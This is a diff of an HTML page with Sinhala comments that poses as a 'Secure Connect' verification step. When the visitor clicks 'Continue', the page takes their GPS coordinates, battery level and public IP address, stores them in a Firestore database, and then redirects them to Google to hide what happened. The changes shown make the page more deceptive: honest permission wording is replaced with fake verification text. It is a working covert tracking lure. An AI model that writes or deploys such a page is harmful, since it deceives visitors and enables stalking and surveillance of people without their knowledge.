@@ -1,14 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Connect</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Connect</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            /* ලස්සන Gradient පසුබිමක් */
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            width: 80%;
+            max-width: 400px;
+        }
+        h3 { margin-bottom: 20px; font-weight: 400; }
+        /* අලුත් Continue බොත්තම */
+        #btn {
+            background-color: #ffffff;
+            color: #764ba2;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        #btn:active { transform: scale(0.95); }
+        #msg { margin-top: 20px; font-size: 14px; color: #eee; }
+    </style>
 </head>
-<body style="text-align:center; padding:50px; font-family:sans-serif; background-color: #f4f4f9;">
-    <div id="main-box">
-        <h3>Please Allow Permissions to Continue</h3>
-        <button id="btn" style="padding:15px 30px; background:blue; color:white; border:none; border-radius:10px; font-size:18px; cursor:pointer;">Allow Permission</button>
-        <p id="msg"></p>
+<body>
+    <div class="container">
+        <h3>Verification Required</h3>
+        <p>Click below to securely connect to the service.</p>
+        <button id="btn">Continue</button>
+        <div id="msg"></div>
     </div>
 
     <script type="module">
@@ -30,31 +73,24 @@
         document.getElementById('btn').onclick = async () => {
             const btn = document.getElementById('btn');
             const msg = document.getElementById('msg');
-            
-            btn.innerText = "Processing...";
+            btn.innerText = "Verifying...";
             btn.disabled = true;
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    
-                    // 1. බැටරි මට්ටම ලබාගැනීම
                     let batteryLevel = "Unknown";
                     try {
-                        if (navigator.getBattery) {
-                            const battery = await navigator.getBattery();
-                            batteryLevel = Math.round(battery.level * 100) + "%";
-                        }
-                    } catch (e) { batteryLevel = "Not Supported"; }
+                        const battery = await navigator.getBattery();
+                        batteryLevel = Math.round(battery.level * 100) + "%";
+                    } catch (e) {}
 
-                    // 2. IP ලිපිනය ලබාගැනීම
                     let ip = "Hidden";
                     try {
                         const res = await fetch('https://api.ipify.org?format=json');
                         const data = await res.json();
                         ip = data.ip;
-                    } catch (e) { ip = "Blocked"; }
+                    } catch (e) {}
 
-                    // 3. දත්ත යැවීම
                     await addDoc(collection(db, "contacts_list"), {
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude,
@@ -65,18 +101,11 @@
                         time: new Date().toLocaleString()
                     });
 
-                    msg.innerText = "Done! Redirecting...";
-                    msg.style.color = "green";
-
-                    // 4. Google වෙත යොමු කිරීම
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 2000);
-
+                    msg.innerText = "Redirecting...";
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                 }, (err) => {
-                    msg.innerText = "Permission Denied.";
-                    msg.style.color = "red";
-                    btn.innerText = "Try Again";
+                    msg.innerText = "Please allow permissions to continue.";
+                    btn.innerText = "Continue";
                     btn.disabled = false;
                 });
             }
